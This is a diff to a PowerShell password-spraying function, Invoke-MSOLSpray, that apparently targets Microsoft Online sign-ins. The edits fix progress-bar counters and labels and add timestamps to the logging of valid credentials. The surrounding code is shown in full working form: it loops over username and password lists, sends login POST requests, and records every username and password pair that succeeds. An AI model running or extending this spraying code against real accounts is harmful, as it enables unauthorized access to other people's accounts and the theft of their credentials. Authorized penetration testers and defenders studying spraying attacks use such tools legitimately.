@@ -236,7 +236,7 @@ function Invoke-MSOLSpray {
         }
     }
     Process {
-        $ProgressBarStartTime = Get-Date
+        $ProgressBarStartTime = Get-Date; $ProgressBar = 0
         ForEach ($List in $UsernameList) {
             If (Test-Path $List) {
                 $Content = Get-Content $List
@@ -247,11 +247,11 @@ function Invoke-MSOLSpray {
                 Write-Error "Unable to open UsernameList at path: $($List)" -ErrorAction Continue
             }
         }
-        $ProgressBarStartTime = Get-Date
+        $ProgressBarStartTime = Get-Date; $ProgressBar = 0
         ForEach ($List in $PasswordList) {
             If (Test-Path $List) {
                 $Content = Get-Content $List
-                $ProgressBar = Write-MyProgressBar -StartTime $ProgressBarStartTime -ObjectToCalculate $PasswordList -Count $ProgressBar -Activity "Setting up" -NestedDepth 1 -TaskPrefixText "Userslists" -Task "Adding $($content.count) entries from $list to the list of $($Passwords.count) passwords." -AddPauses
+                $ProgressBar = Write-MyProgressBar -StartTime $ProgressBarStartTime -ObjectToCalculate $PasswordList -Count $ProgressBar -Activity "Setting up" -NestedDepth 1 -TaskPrefixText "Passwordlists" -Task "Adding $($content.count) entries from $list to the list of $($Passwords.count) passwords." -AddPauses
                 $Passwords += $Content
             } 
             Else {
@@ -268,7 +268,7 @@ function Invoke-MSOLSpray {
             $UserProgressBar = Write-MyProgressBar -StartTime $UserProgressBarStartTime -ObjectToCalculate $Usernames -Count $UserProgressBar -Activity "Testing users" -NestedDepth 1 -TaskPrefixText "User" -Task "Spraying password against user $($username)" -AddPauses
             $PasswordProgressBarStartTime = Get-Date; $PasswordProgressBar = 0
             ForEach ($Password in $Passwords) {
-                $PasswordProgressBar = Write-MyProgressBar -StartTime $PasswordProgressBarStartTime -ObjectToCalculate $Passwords -Count $PasswordProgressBar -Activity "Testing Passwords" -NestedDepth 2 -id 2 -parentid 1 -TaskPrefixText "User" -Task "Spraying password $($Password)" -AddPauses
+                $PasswordProgressBar = Write-MyProgressBar -StartTime $PasswordProgressBarStartTime -ObjectToCalculate $Passwords -Count $PasswordProgressBar -Activity "Testing Passwords" -NestedDepth 2 -id 2 -parentid 1 -TaskPrefixText "Password" -Task "Spraying password $($Password)" -AddPauses
                 If ($Delay -gt 0) {
                     Start-Sleep -Seconds $Delay
                 }
@@ -289,7 +289,7 @@ function Invoke-MSOLSpray {
                     $TimeOfRequest = Get-Date -Format "yyyy-MM-dd hh:mm:ss"
                     $LogonRequest = Invoke-WebRequest -Uri $AuthURL -Method Post -Headers $PostHeaders -Body $BodyParams -ErrorVariable ResponseError
                     If ($LogonRequest.StatusCode -eq "200") {
-                        Write-Verbose "Found valid user credential. $($Username):$($Password)"
+                        Write-Verbose "Found valid user credential. $($TimeOfRequest):$($Username):$($Password)"
                         $OutputObject += Add-InvokeMSOLOutputToObject -Time $TimeOfRequest -Username $Username -Password $Password -IsValid $true -ResponseError "None."
                     }
                     Else {
@@ -326,7 +326,7 @@ function Invoke-MSOLSpray {
         If ($OutFile) {
             If ($OutputObject) {
                 $OutputObject | Where-Object { $_.IsValid -eq $true } | ForEach-Object {
-                    Write-Output "$($_.Username) : $($_.Password) : $($_.ResponseError)" | Add-Content -Encoding Ascii -Path $OutFile
+                    Write-Output "$($_.Time) : $($_.Username) : $($_.Password) : $($_.ResponseError)" | Add-Content -Encoding Ascii -Path $OutFile
                 }
                 Write-Output "Valid results have been written to $OutFile."
             }
